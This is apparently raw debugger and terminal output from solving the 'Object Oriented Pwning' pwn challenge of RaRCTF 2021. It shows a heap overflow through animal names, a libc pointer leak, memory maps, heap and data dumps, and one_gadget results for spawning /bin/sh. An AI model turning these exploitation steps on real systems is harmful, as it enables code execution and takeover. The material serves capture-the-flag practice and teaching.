> 2
What will you name your new animal? BBBBBBBBBBB
Your current balance is 983
1) List Animals
2) Act on Animal
3) Buy New Animal
4) Buy translator (1000c)
5) Sell The Farm
> 1
0: AAAAAAAAAcccc (Age: 5, Hunger: 3/15)
1: BBBBBBBBBBBb (Age: 3, Hunger: 2/15)
All animals introduced!
Your current balance is 983
1) List Animals
2) Act on Animal
3) Buy New Animal
4) Buy translator (1000c)
5) Sell The Farm
> 2
Which animal? 0
1) Sell
2) Feed (50c)
3) Rename (100c)
4) Translate
> 4
 __________
< Feed me! >
 ----------
 \
  \
    (\____/)
    / @__@ \
   (  (oo)  )
    `-.~~.-'
     /    \
   @/      \_
  (/ /    \ \)
   WW`----'WW
Unknown option
Your current balance is 983
1) List Animals
2) Act on Animal
3) Buy New Animal
4) Buy translator (1000c)
5) Sell The Farm
> 2
Which animal? 1
1) Sell
2) Feed (50c)
3) Rename (100c)
4) Translate

pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r--p     1000 0      /home/mito/CTF/RaRCTF_2021/Pwn_Object_Oriented_Pwning_600/OOP/oop
          0x401000           0x403000 r-xp     2000 1000   /home/mito/CTF/RaRCTF_2021/Pwn_Object_Oriented_Pwning_600/OOP/oop
          0x403000           0x404000 r--p     1000 3000   /home/mito/CTF/RaRCTF_2021/Pwn_Object_Oriented_Pwning_600/OOP/oop
          0x404000           0x405000 r--p     1000 3000   /home/mito/CTF/RaRCTF_2021/Pwn_Object_Oriented_Pwning_600/OOP/oop
          0x405000           0x406000 rw-p     1000 4000   /home/mito/CTF/RaRCTF_2021/Pwn_Object_Oriented_Pwning_600/OOP/oop
          0x406000           0x427000 rw-p    21000 0      [heap]
    0x7ffff70a3000     0x7ffff728a000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff728a000     0x7ffff748a000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff748a000     0x7ffff748e000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff748e000     0x7ffff7490000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7490000     0x7ffff7494000 rw-p     4000 0      
    0x7ffff7494000     0x7ffff74ab000 r-xp    17000 0      /lib/x86_64-linux-gnu/libgcc_s.so.1
    0x7ffff74ab000     0x7ffff76aa000 ---p   1ff000 17000  /lib/x86_64-linux-gnu/libgcc_s.so.1
    0x7ffff76aa000     0x7ffff76ab000 r--p     1000 16000  /lib/x86_64-linux-gnu/libgcc_s.so.1
    0x7ffff76ab000     0x7ffff76ac000 rw-p     1000 17000  /lib/x86_64-linux-gnu/libgcc_s.so.1
    0x7ffff76ac000     0x7ffff7849000 r-xp   19d000 0      /lib/x86_64-linux-gnu/libm-2.27.so
    0x7ffff7849000     0x7ffff7a48000 ---p   1ff000 19d000 /lib/x86_64-linux-gnu/libm-2.27.so
    0x7ffff7a48000     0x7ffff7a49000 r--p     1000 19c000 /lib/x86_64-linux-gnu/libm-2.27.so
    0x7ffff7a49000     0x7ffff7a4a000 rw-p     1000 19d000 /lib/x86_64-linux-gnu/libm-2.27.so
    0x7ffff7a4a000     0x7ffff7bc3000 r-xp   179000 0      /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25
    0x7ffff7bc3000     0x7ffff7dc3000 ---p   200000 179000 /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25
    0x7ffff7dc3000     0x7ffff7dcd000 r--p     a000 179000 /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25
    0x7ffff7dcd000     0x7ffff7dcf000 rw-p     2000 183000 /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25
    0x7ffff7dcf000     0x7ffff7dd3000 rw-p     4000 0      
    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7fd1000     0x7ffff7fd7000 rw-p     6000 0      
    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 29000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 2a000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
pwndbg> bins

0x418270:	0x0000000000000000	0x0000000000000041
0x418280:	0x0000000000000000	0x0000000000406010
0x418290:	0x0000000000000000	0x4444444405031400
0x4182a0:	0x4444444444444444	0x4141414141416464
0x4182b0:	0x4141414141414141	0x0000000000000041
0x4182c0:	0x0000000000404d78	0x0000000000676970
0x4182d0:	0x0000000000000000	0x4343434308041200
0x4182e0:	0x4242634343434343	0x4242424242424242
0x4182f0:	0x4242424242424242	0x4142424242424242
0x418300:	0x0000000000000000	0x0000000000000000

pwndbg> x/80gx 0x405000
0x405000:	0x0000000000404db8	0x00007ffff7ffe170
0x405010:	0x00007ffff7dea8f0	0x00007ffff71243d0
0x405020:	0x00007ffff7107f70	0x00007ffff7b47380
0x405030:	0x0000000000401066	0x00007ffff70e74c0
0x405040:	0x00007ffff70e6a00	0x00007ffff76e9160
0x405050:	0x00007ffff7b457e0	0x00000000004010b6
0x405060:	0x00007ffff70e6550	0x00007ffff7ffaf10
0x405070:	0x00007ffff7159320	0x00007ffff7adb390
0x405080:	0x00007ffff70e6cd0	0x00007ffff7add280
0x405090:	0x0000000000401126	0x00007ffff712afd0
0x4050a0:	0x00007ffff7aed260	0x00007ffff7123aa0
0x4050b0:	0x0000000000000000	0x0000000000000000
0x4050c0 <money>:	0x0000000000000359	0x0000000000000000
0x4050d0 <completed.0>:	0x0000000000000000	0x0000000000000000
0x4050e0 <_ZStL8__ioinit>:	0x0000000000000000	0x0000000000000000
0x4050f0 <animals>:	0x0000000000418e80	0x0000000000418ec0
0x405100 <animals+16>:	0x0000000000000000	0x0000000000000000
0x405110 <animals+32>:	0x0000000000000000	0x0000000000000000
0x405120 <animals+48>:	0x0000000000000000	0x0000000000000000
0x405130 <animals+64>:	0x0000000000000000	0x0000000000000000
0x405140 <animals+80>:	0x0000000000000000	0x0000000000000000
0x405150 <animals+96>:	0x0000000000000000	0x0000000000000000
0x405160 <animals+112>:	0x0000000000000000	0x0000000000000000
0x405170 <translator>:	0x0000000000000000	0x0000000000000000
0x405180:	0x0000000000000000	0x0000000000000000
0x405190:	0x0000000000000000	0x0000000000000000

0: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\xa0�H�\xff\x7f (Age: 11, Hunger: 14/15)
1: bbbbbbbbbbbbbbbbbbbbbbbbbbbb� (Age: 12, Hunger: 9/15)
2: cccccccccccccccccccccccccccc� (Age: 9, Hunger: 10/15)
3: dddddddddddddddddddddddddddd� (Age: 9, Hunger: 5/15)
4: aaaaaaaaaaaaaaaaaaaaaaaaaaaa� (Age: 5, Hunger: 5/15)
All animals introduced!


0x418e60:	0x0000000000000000	0x0000000000000000
0x418e70:	0x0000000000000000	0x0000000000000041
0x418e80:	0x0000000000404d78	0x0000000000676970
0x418e90:	0x0000000000000000	0x626262620d0a1200
0x418ea0:	0x6262626262626262	0x6262626262626262
0x418eb0:	0x6262626262626262	0x00000000000000c1
0x418ec0:	0x0000000000418f00	0x0000000000406010
0x418ed0:	0x0000000000000000	0x6363636312151201
0x418ee0:	0x6363636363636363	0x6363636363636363
0x418ef0:	0x6363636363636363	0x00000000000000c1
0x418f00:	0x0000000000418f40	0x0000000000406010
0x418f10:	0x0000000000000000	0x6464646412111201
0x418f20:	0x6464646464646464	0x6464646464646464
0x418f30:	0x6464646464646464	0x00000000000000c1
0x418f40:	0x0000000000000000	0x0000000000406010
0x418f50:	0x0000000000000000	0x6161616113121201
0x418f60:	0x6161616161616161	0x6161616161616161
0x418f70:	0x6161616161616161	0x0000000000000041
0x418f80:	0x0000000000419180	0x0000000000406010
0x418f90:	0x0000000000000000	0x6b6b6b6b120c1201
0x418fa0:	0x6b6b6b6b6b6b6b6b	0x6b6b6b6b6b6b6b6b
0x418fb0:	0x6b6b6b6b6b6b6b6b	0x00000000000000c1
0x418fc0:	0x0000000000418ec0	0x0000000000406010
0x418fd0:	0x0000000000000000	0x62626262130e1201
0x418fe0:	0x6262626262626262	0x6262626262626262
0x418ff0:	0x6262626262626262	0x00000000000000c1
0x419000:	0x0000000000418fc0	0x0000000000406010
0x419010:	0x0000000000000000	0x6363636313101201
0x419020:	0x6363636363636363	0x6363636363636363
0x419030:	0x6363636363636363	0x00000000000000c1
0x419040:	0x0000000000419000	0x0000000000406010
0x419050:	0x0000000000000000	0x6565656510141201
0x419060:	0x6565656565656565	0x6565656565656565
0x419070:	0x6565656565656565	0x0000000000000041
0x419080:	0x0000000000404d78	0x0000000000676970
0x419090:	0x0000000000000000	0x646464640c071200
0x4190a0:	0x6464646464646464	0x6464646464646464
0x4190b0:	0x6464646464646464	0x00000000000000c1
0x4190c0:	0x0000000000419040	0x0000000000406010
0x4190d0:	0x0000000000000000	0x6767676713111201
0x4190e0:	0x6767676767676767	0x6767676767676767
0x4190f0:	0x6767676767676767	0x0000000000000041
0x419100:	0x0000000000404d78	0x0000000000676970
0x419110:	0x0000000000000000	0x585858580d111200
0x419120:	0x5858585858585858	0x5858585858585858
0x419130:	0x5858585858585858	0x5858585858585858
0x419140:	0x00007ffff748eca0	0x00007ffff748eca0
0x419150:	0x0000000000000000	0x6969696911151201
0x419160:	0x6969696969696969	0x6969696969696969
0x419170:	0x6969696969696969	0x0000000000000041
0x419180:	0x0000000000000000	0x0000000000406010
0x419190:	0x0000000000000000	0x6a6a6a6a120e1201
0x4191a0:	0x6a6a6a6a6a6a6a6a	0x6a6a6a6a6a6a6a6a
0x4191b0:	0x6a6a6a6a6a6a6a6a	0x0000000000000041
0x4191c0:	0x0000000000404d78	0x0000000000676970
0x4191d0:	0x0000000000000000	0x6161616106071200
0x4191e0:	0x6161616161616161	0x6161616161616161
0x4191f0:	0x6161616161616161	0x00000000000000c1
0x419200:	0x0000000000404d78	0x0000000000676970
0x419210:	0x0000000000000000	0x636363630c0c1200
0x419220:	0x6363636363636363	0x6363636363636363
0x419230:	0x6363636363636363	0x00000000000000c1
0x419240:	0x0000000000000000	0x0000000000676970
0x419250:	0x0000000000000000	0x7171717112101201
0x419260:	0x7171717171717171	0x7171717171717171
0x419270:	0x7171717171717171	0x00000000000000c1
0x419280:	0x0000000000000000	0x0000000000000000
0x419290:	0x0000000000000000	0x0000000000000000

mito@ubuntu:~/CTF/RaRCTF_2021/Pwn_Object_Oriented_Pwning_600/OOP$ one_gadget /lib/x86_64-linux-gnu/libc.so.6 
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

